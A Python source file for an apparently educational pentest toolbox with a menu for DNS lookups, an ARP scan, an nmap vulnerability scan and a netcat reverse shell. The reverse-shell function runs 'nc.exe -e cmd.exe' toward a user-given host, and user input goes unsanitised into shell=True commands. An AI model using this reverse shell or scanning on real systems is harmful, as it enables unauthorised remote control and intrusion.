# Welcome to The Generoso SDV-toolbox

# Librairies
import socket
import subprocess
import dns.resolver
import time
import threading
import sys
import datetime
from scapy.all import ARP, Ether, srp

# Auto-reporting into the logs.txt
class DualWriter:
    def __init__(self, *writers):
        self.writers = writers

    def write(self, text):
        for w in self.writers:
            w.write(text)

    def flush(self):
        for w in self.writers:
            w.flush()

def log_to_file(function):
    def wrapper(*args, **kwargs):
        original_stdout = sys.stdout
        with open('logs.txt', 'a', encoding='utf-8') as f:
            # Write date & time before execution
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f'\n[{timestamp}] Execution of {function.__name__}\n')
            # Double write in prompt & in the log file
            sys.stdout = DualWriter(f, original_stdout)
            result = function(*args, **kwargs)
        sys.stdout = original_stdout
        return result
    return wrapper

# Get your own IP
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        IP = s.getsockname()[0]
    finally:
        s.close()
    return IP

# The menu
# Displaying the menu structure
def afficher_menu():
    print("\n╔══════════════════════════════════════╗")
    print("║       The Generoso SDV-toolbox       ║")
    print("║                                      ║")
    print("║               Main menu              ║")
    print("╠══════════════════════════════════════╣")
    print("║ Functions :                          ║")
    print("║  1. Domain check-up                  ║")
    print("║  2. ARP scan                         ║")
    print("║  3. Vulnerability scan               ║")
    print("║  4. Reverse shell                    ║")
    print("╠══════════════════════════════════════╣")
    print("║  0. Exit                             ║")
    print("╚══════════════════════════════════════╝")
    print("Your IP address: ", get_ip_address())

# Function to execute the menu
def executer_menu():
    while True:
        afficher_menu()
        choix = input("\nPlease enter your choice: ")
        if choix == "1":
            domain_check()
        elif choix == "2":
            arp_scan()
        elif choix == "3":
            vuln_scan()
        elif choix == "4":
            reverse_shell()
        elif choix == "0":
            print("\n════════════════════════════════════════")
            print("Exiting...")
            time.sleep(3) 
            break
        else:
            print("Invalid choice. Please enter a number between 0 and 4: ")

# Functions list
# Function 1 - Domain check-up with DNSPython
@log_to_file
def domain_check():
    print("\n╔═════════════════╗")
    print("║ Domain check-up ║")
    print("╚═════════════════╝")
    target = input("Please enter a domain name: ")
    resolver = dns.resolver.Resolver()
    resolver.timeout = 10
    resolver.lifetime = 10
    resolver.nameservers = ['8.8.8.8']

    try:
        # Displaying IP Address from the domain
        ip_address = socket.gethostbyname(target)
        print("\n════════════════════════════════════════")
        print(f"The IP address of {target} is {ip_address}")

        # DNS resolution 
        ns_records = resolver.resolve(target, 'NS')
        print("\nDNS: ")
        for ns in ns_records:
            ns_ip = socket.gethostbyname(str(ns.target))
            print(f'{ns.target} has IP address {ns_ip}')

        mx_records = resolver.resolve(target, 'MX')
        print("\nMX records: ")
        for mx in mx_records:
            mx_ip = socket.gethostbyname(str(mx.exchange))
            print(f'{mx.exchange} has a priority of {mx.preference} and IP address {mx_ip}')

        txt_records = resolver.resolve(target, 'TXT')
        print("\nTXT records: ")
        for txt in txt_records:
            print(txt.strings)
        print("════════════════════════════════════════")

    except socket.gaierror as e:
        print(f"Error when searching for domain name {target}: {e} ")
    except dns.resolver.NoAnswer as e:
        print(f"No nameservers available for {target}: {e} ")
    except Exception as e:
        print(f"An error has occurred: {e} ")

# Function 2 - ARP scan with Scapy
@log_to_file
def arp_scan():
    print("\n╔══════════╗")
    print("║ ARP scan ║")
    print("╚══════════╝")
    target_network = input("Please enter a network to scan (default 192.168.1.0/24): ")
    if not target_network:
        target_network = "192.168.1.0/24"

    # Creating an ARP request
    arp = ARP(pdst=target_network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Sending the packet and receiving the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parsing the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Displaying the results
    print("\n════════════════════════════════════════")
    print(f"Devices found in {target_network}:")
    for device in devices:
        print(f"IP Address: {device['ip']} - MAC Address: {device['mac']}")
    print("════════════════════════════════════════")


# Function 3 - Vulnerability scan (ports and services scan with Nmap adding NSE)
@log_to_file
def vuln_scan():
    print("\n╔════════════════════╗")
    print("║ Vulnerability scan ║")
    print("╚════════════════════╝")
    print("Please enter an IP address or a domain to scan: ")
    cible = input("-> ")
    attaque = input("Enter the attack level from 0 to 5 (default 3): ")
    if not attaque:
        attaque = "3"
    debut_port = input("Enter the first port to scan (default 1): ")
    if not debut_port:
        debut_port = "1"
    fin_port = input("Enter the last port to scan (default 1000): ")
    if not fin_port:
        fin_port = "1000"
   
    # Nmap command
    print("Starting a vulnerability scan...")
    commande_nmap = ["nmap", "-Pn", f"-T{attaque}", f"-p{debut_port}-{fin_port}", "-sV", "--script=vuln", cible]
    try:
        resultat = subprocess.run(commande_nmap, capture_output=True, text=True, check=True)
        print("\n════════════════════════════════════════")
        print(resultat.stdout)
        print("════════════════════════════════════════")
    except subprocess.CalledProcessError as e:
        print("An error occurred: ", e)

# Function 4.1 - Reverse shell with Netcat (listening process)
def ecoute_netcat(port):
    chemin_netcat = r"C:\netcat-win32-1.12\nc.exe"
    commande_ecoute = f"{chemin_netcat} -lvp {port}"
    try:
        subprocess.run(commande_ecoute, shell=True)
    except subprocess.CalledProcessError as e:
        print("Error executing netcat command: ", e)

# Function 4.2 - Reverse shell with Netcat (connexion process)
@log_to_file
def reverse_shell():
    print("\n╔═══════════════╗")
    print("║ Reverse shell ║")
    print("╚═══════════════╝")
    print("Please enter the host IP: ")
    ip_cible = input("-> ")
    print("Please enter the listening port (default 4444): ")
    port = input("-> ")
    if not port:
        port = "4444"
   
    # Custom path
    chemin_netcat = r"C:\netcat-win32-1.12\nc.exe"  

    # Netcat execution
    commande_netcat = f"{chemin_netcat} -e cmd.exe {ip_cible} {port}"
    thread_ecoute = threading.Thread(target=ecoute_netcat, args=(port,))
    thread_ecoute.start()
    time.sleep(2)
    try:
        resultat = subprocess.run(commande_netcat, shell=True)
        print("\n════════════════════════════════════════")
        print(resultat)
        print("════════════════════════════════════════")
    except subprocess.CalledProcessError as e:
        print("Error executing netcat command: ", e)

# Execution of the menu
if __name__ == "__main__":
    executer_menu()